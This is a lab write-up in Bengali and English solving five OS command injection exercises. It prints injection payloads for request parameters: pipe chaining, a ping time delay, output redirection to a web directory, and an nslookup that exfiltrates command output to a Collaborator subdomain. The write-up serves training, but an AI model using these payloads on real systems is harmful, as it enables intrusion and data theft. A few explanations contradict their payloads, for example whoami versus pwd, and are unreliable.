             OS command injection


Lab 1: OS command injection, simple case

Burp Suite চালু করে stock level check করার request intercept করি।
আমি রিকোয়েস্টে storeID নামের একটি parameter দেখছি। storeID parameter আছে।
এখন storeID parameter টা পরিবর্তন করি।
Payload
storeID=1|whoami

ব্যাখ্যা
| (pipe) চিহ্ন দিয়ে আগের command শেষ করে নতুন command চালানো হয়।
whoami কমান্ড সার্ভারে চলমান user এর নাম দেখায়।
ফলাফল
Response এর ভেতরে বর্তমান user এর নাম দেখা যায়।

lab solved

   Lab 2: Blind OS command injection with time delays

Burp Suite দিয়ে feedback submit করার request intercept করি।
Request এ email parameter পরিবর্তন করি।
Payload
email=a||ping+-c+15+127.0.0.1||

ব্যাখ্যা
|| দিয়ে command chain করা হয়েছে।
ping -c 1 মানে 15 বার ping → প্রায় 15 সেকেন্ড delay।
আউটপুট না দেখলেও ডিলে থাকে। ডিলে থাকলে আমরা বুঝি কমান্ড চালু হয়েছে।
ফলাফল
Response আসতে প্রায় ১৫ সেকেন্ড সময় । Response এর জন্য, এই সময়ই দরকার।

Lab Solved


     Lab 3: Blind OS command injection with output redirection

Command output ফাইলে লেখা
Feedback submit request intercept করি।
email parameter পরিবর্তন করি।
Payload
email=||pwd>/var/www/images/output.txt||

ব্যাখ্যা
whoami এর output /var/www/images/output.txt ফাইলে লেখা হচ্ছে।
/images/ ডিরেক্টরি web-accessible।

 Output ফাইল পড়া
Product image লোড করার request intercept করি।
filename parameter পরিবর্তন করি।
Payload
filename=output.txt

In the response you see the output of the pwd command.

Lab Solved


    Lab 4: Blind OS command injection with out-of-band interaction



Burp Suite দিয়ে feedback request intercept করি।
I use the following payload in the email parameter. The payload is placed in the email parameter.
Payload
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||

nslookup external DNS request পাঠায়।
যদি Server command execute করে, আপনি Burp Collaborator এ interaction দেখবেন।
ফলাফল
Burp Collaborator এ DNS interaction দেখা যায়।

Lab Solved

   Lab 5: Blind OS command injection with OAST data exfiltration

Burp Suite Professional এর Collaborator tab এ যাই।
Copy to clipboard ক্লিক করে unique payload নিই।
Feedback request intercept করি।
email parameter পরিবর্তন করি।
Payload
email=||nslookup+`pwd`.BURP-COLLABORATOR-SUBDOMAIN||

ব্যাখ্যা
`pwd` → command substitution
Command output DNS subdomain হিসেবে পাঠানো হয়।
ফলাফল
Collaborator tab → Poll now
DNS interaction দেখা যায়।
Description tab এ সম্পূর্ণ domain দেখা যায়।
Domain এর ভেতরেই pwd এর output থাকে।

Lab Solved